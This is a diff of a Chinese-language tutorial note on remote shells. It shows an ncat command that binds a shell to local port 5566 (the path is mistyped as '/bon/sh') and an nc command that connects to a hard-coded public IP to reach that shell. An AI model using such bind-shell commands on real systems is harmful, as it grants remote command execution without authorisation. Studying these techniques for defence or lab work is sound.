@@ -274,7 +274,7 @@ windows 控制 linux 也差不多：
 
 ```shell
 # linux 绑定sh到其本地5566端口
-ncat -e /bon/sh -lvp 5566
+ncat -e /bon/sh -lvvp 5566
 # win 主动连接目标5566
 nc 47.94.236.117 5566
 ```
